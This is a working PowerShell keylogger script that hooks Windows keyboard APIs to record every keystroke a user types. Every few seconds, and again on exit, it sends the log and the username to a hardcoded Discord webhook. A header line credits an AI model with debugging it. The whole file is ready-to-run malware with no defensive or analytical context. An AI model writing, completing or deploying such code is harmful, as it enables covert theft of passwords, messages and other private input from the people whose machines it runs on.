# powershell keylogger
# created by: C0SM0, debugged by Grok

# webhook, CHANGE ME
$webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40mQiRLo6enK1A4YajR8qR0jExZTA4zuPr6i7c4G4SYUCSpPxzhllBke"

# write pid
$PID | Out-File "$env:TEMP\DdBPKCytRe"

# keylogger function
function KeyLogger($logFile="$env:TEMP\$env:UserName.log") {
    # create log file if it doesn't exist
    if (-not (Test-Path $logFile)) {
        New-Item -Path $logFile -ItemType File -Force | Out-Null
    }

    # API signatures
    $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    # set up API
    $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

    # track time for periodic webhook posting
    $lastWebhookTime = Get-Date

    # attempt to log keystrokes
    try {
        while ($true) {
            Start-Sleep -Milliseconds 40

            # check if 5 seconds have passed to send logs
            if (((Get-Date) - $lastWebhookTime).TotalSeconds -ge 5) {
                try {
                    # read logs
                    $logs = Get-Content -Path $logFile -Raw -Encoding Unicode
                    if ($logs) {
                        # prepare webhook payload
                        $Body = @{
                            'username' = $env:UserName
                            'content'  = $logs
                        }
                        # send logs to webhook
                        Invoke-RestMethod -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json) -ContentType 'application/json' | Out-Null
                        # clear log file after successful sending
                        Clear-Content -Path $logFile -Force
                    }
                }
                catch {
                    # log error to file for debugging
                    Add-Content -Path "$env:TEMP\keylogger_error.log" -Value $_.Exception.Message
                }
                $lastWebhookTime = Get-Date
            }

            # log keystrokes
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                $keystate = $API::GetAsyncKeyState($ascii)
                if ($keystate -eq -32767) {
                    $null = [console]::CapsLock
                    $mapKey = $API::MapVirtualKey($ascii, 3)
                    $keyboardState = New-Object Byte[] 256
                    $hideKeyboardState = $API::GetKeyboardState($keyboardState)
                    $loggedchar = New-Object -TypeName System.Text.StringBuilder

                    if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                        [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    finally {
        # send any remaining logs on exit
        try {
            $logs = Get-Content -Path $logFile -Raw -Encoding Unicode
            if ($logs) {
                $Body = @{
                    'username' = $env:UserName
                    'content'  = $logs
                }
                Invoke-RestMethod -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json) -ContentType 'application/json' | Out-Null
            }
        }
        catch {
            # log error to file for debugging
            Add-Content -Path "$env:TEMP\keylogger_error.log" -Value $_.Exception.Message
        }
    }
}

# run keylogger
KeyLogger
